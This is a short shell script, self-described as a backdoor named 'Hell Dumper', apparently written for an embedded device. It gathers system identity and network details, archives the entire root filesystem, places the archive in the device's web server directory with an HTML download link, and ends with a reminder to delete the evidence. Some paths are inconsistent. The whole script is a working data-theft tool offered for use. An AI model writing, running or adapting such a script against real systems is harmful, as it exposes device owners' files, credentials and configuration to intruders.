#!/bin/sh

### i'm the seconde_backdoor ;) ###

echo " Hell Dumper \n"
mkdir /tmp/leak
id && uname -a && cat /etc/HOSTNAME

ip=`ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'`

ifconfig | grep inet > /tmp/fuck/network_info.txt

tar -czvf dump.tar.gz /

cp dump.tar.gz /mnt/mtdblock/service/webserver/dumper.tar.gz

echo " Here is your device_ip target : "
echo "<pre>Download Here<a href='dumper.tar.gz'>[x]">/mnt/mtdblock/service/webserver/dump.html | echo " Check http://"$ip"/dump.html" 

### don't forget to :  rm-rf /mnt/mtdblock/service/webserver/dumper.tar.gz 
